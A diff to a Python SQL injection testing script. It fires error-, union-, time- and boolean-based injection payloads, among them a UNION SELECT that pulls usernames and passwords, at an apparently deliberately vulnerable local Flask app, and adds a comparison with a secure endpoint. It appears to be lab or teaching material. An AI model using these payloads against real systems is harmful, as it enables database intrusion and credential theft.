@@ -6,6 +6,7 @@ This script demonstrates different types of SQL injection attacks
 import requests
 import time
 import sys
+import argparse
 
 BASE_URL = "http://localhost:5000/user"
 
@@ -15,9 +16,9 @@ def print_banner(title):
     print(f" {title} ".center(60, "*"))
     print("=" * 60)
 
-def send_request(payload):
+def send_request(payload, use_secure=False):
     """Send a request with the given payload and return the response"""
-    url = f"{BASE_URL}?id={payload}"
+    url = f"http://localhost:5000/{'secure-user' if use_secure else 'user'}?id={payload}"
     print(f"[+] Testing URL: {url}")
 
     start_time = time.time()
@@ -28,12 +29,12 @@ def send_request(payload):
     print(f"[+] Response time: {elapsed_time:.2f} seconds")
     return response.text, elapsed_time
 
-def test_normal_input():
+def test_normal_input(use_secure=False):
     """Test with a normal, non-malicious input"""
     print_banner("NORMAL INPUT TEST")
     payload = "1"
     print(f"[+] Payload: {payload}")
-    response, _ = send_request(payload)
+    response, _ = send_request(payload, use_secure)
 
     if "No user found" not in response and "Error" not in response:
         print("[+] SUCCESS: Normal request returned user data")
@@ -46,7 +47,7 @@ def test_normal_input():
     else:
         print("[-] FAILED: Normal request did not return expected data")
 
-def test_error_based_sqli():
+def test_error_based_sqli(use_secure=False):
     """Test error-based SQL injection"""
     print_banner("ERROR-BASED SQL INJECTION")
     payloads = [
@@ -60,7 +61,7 @@ def test_error_based_sqli():
 
     for payload in payloads:
         print(f"\n[+] Payload: {payload}")
-        response, _ = send_request(payload)
+        response, _ = send_request(payload, use_secure)
 
         if "Error" in response:
             print("[+] SQL Error detected!")
@@ -75,7 +76,7 @@ def test_error_based_sqli():
         else:
             print("[+] Query returned data (potential bypass successful)")
 
-def test_union_based_sqli():
+def test_union_based_sqli(use_secure=False):
     """Test UNION-based SQL injection"""
     print_banner("UNION-BASED SQL INJECTION")
     payloads = [
@@ -89,7 +90,7 @@ def test_union_based_sqli():
 
     for payload in payloads:
         print(f"\n[+] Payload: {payload}")
-        response, _ = send_request(payload)
+        response, _ = send_request(payload, use_secure)
 
         if "Error" in response:
             print("[-] Query failed with error")
@@ -101,12 +102,12 @@ def test_union_based_sqli():
             if "Username:" in response or "password" in response.lower():
                 print("[+] Potentially sensitive data found in the response!")
 
-def test_time_based_sqli():
+def test_time_based_sqli(use_secure=False):
     """Test time-based blind SQL injection"""
     print_banner("TIME-BASED BLIND SQL INJECTION")
 
     print("[+] Testing normal request for baseline...")
-    _, normal_time = send_request("1")
+    _, normal_time = send_request("1", use_secure)
 
     # Test with increasing delay times
     delay_payloads = [
@@ -119,14 +120,14 @@ def test_time_based_sqli():
         print(f"\n[+] Payload: {payload}")
         print(f"[+] Expected delay: ~{expected_delay} seconds")
 
-        _, elapsed_time = send_request(payload)
+        _, elapsed_time = send_request(payload, use_secure)
 
         if elapsed_time >= expected_delay:
             print(f"[+] SUCCESS: Time-based injection confirmed! Response delayed by {elapsed_time:.2f} seconds")
         else:
             print(f"[-] FAILED: Response time ({elapsed_time:.2f}s) not significantly delayed")
 
-def test_boolean_based_sqli():
+def test_boolean_based_sqli(use_secure=False):
     """Test boolean-based blind SQL injection"""
     print_banner("BOOLEAN-BASED BLIND SQL INJECTION")
 
@@ -145,7 +146,7 @@ def test_boolean_based_sqli():
     print("[+] Testing TRUE conditions (should return data):")
     for payload in true_conditions:
         print(f"\n[+] Payload: {payload}")
-        response, _ = send_request(payload)
+        response, _ = send_request(payload, use_secure)
 
         if "No user found" not in response and "Error" not in response:
             print("[+] SUCCESS: Condition evaluated as TRUE, data returned")
@@ -155,26 +156,76 @@ def test_boolean_based_sqli():
     print("\n[+] Testing FALSE conditions (should NOT return data):")
     for payload in false_conditions:
         print(f"\n[+] Payload: {payload}")
-        response, _ = send_request(payload)
+        response, _ = send_request(payload, use_secure)
 
         if "No user found" in response or "ID:" not in response:
             print("[+] SUCCESS: Condition evaluated as FALSE, no data returned")
         else:
             print("[-] FAILED: Data returned for FALSE condition")
 
+def compare_secure_vs_vulnerable():
+    """Compare secure endpoint vs vulnerable endpoint with the same payloads"""
+    print_banner("SECURITY COMPARISON: VULNERABLE VS SECURE ENDPOINTS")
+
+    test_payloads = [
+        "1",
+        "1'",
+        "1 OR 1=1",
+        "1; SELECT pg_sleep(1)--",
+        "0 UNION SELECT username, password, email FROM users"
+    ]
+
+    for payload in test_payloads:
+        print(f"\n[+] Testing payload: {payload}")
+
+        print("\n[+] Vulnerable endpoint (/user):")
+        vuln_response, vuln_time = send_request(payload, use_secure=False)
+
+        print("\n[+] Secure endpoint (/secure-user):")
+        secure_response, secure_time = send_request(payload, use_secure=True)
+
+        print("\n[+] Comparison:")
+        if "Error" in vuln_response and "Error" not in secure_response:
+            print("✓ Secure endpoint handled error properly")
+        elif "No user found" in secure_response and "No user found" not in vuln_response:
+            print("✓ Secure endpoint rejected malicious input")
+        elif "password" in vuln_response.lower() and "password" not in secure_response.lower():
+            print("✓ Secure endpoint protected sensitive data")
+        else:
+            print("• Results comparison inconclusive")
+        print("-" * 40)
+
 def main():
+    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
+    parser.add_argument("--test", choices=["normal", "error", "union", "time", "boolean", "compare", "all"],
+                      default="all", help="Choose which test to run")
+    parser.add_argument("--secure", action="store_true", help="Test against the secure endpoint")
+    args = parser.parse_args()
+
     print_banner("SQL INJECTION TESTING SCRIPT")
     print("This script will test various SQL injection techniques")
-    print("Ensure your vulnerable Flask app is running on http://localhost:5000")
-
-    input("Press Enter to start testing...")
+    print(f"Testing against {'secure' if args.secure else 'vulnerable'} endpoint")
+    print("Ensure your Flask app is running on http://localhost:5000")
 
     try:
-        test_normal_input()
-        test_error_based_sqli()
-        test_union_based_sqli()
-        test_time_based_sqli()
-        test_boolean_based_sqli()
+        if args.test == "normal" or args.test == "all":
+            test_normal_input(args.secure)
+
+        if args.test == "error" or args.test == "all":
+            test_error_based_sqli(args.secure)
+
+        if args.test == "union" or args.test == "all":
+            test_union_based_sqli(args.secure)
+
+        if args.test == "time" or args.test == "all":
+            test_time_based_sqli(args.secure)
+
+        if args.test == "boolean" or args.test == "all":
+            test_boolean_based_sqli(args.secure)
+
+        if args.test == "compare" or args.test == "all":
+            if args.test == "compare":  # Only run if explicitly selected or as part of "all"
+                compare_secure_vs_vulnerable()
 
         print("\n" + "=" * 60)
         print(" TESTING COMPLETE ".center(60, "*"))
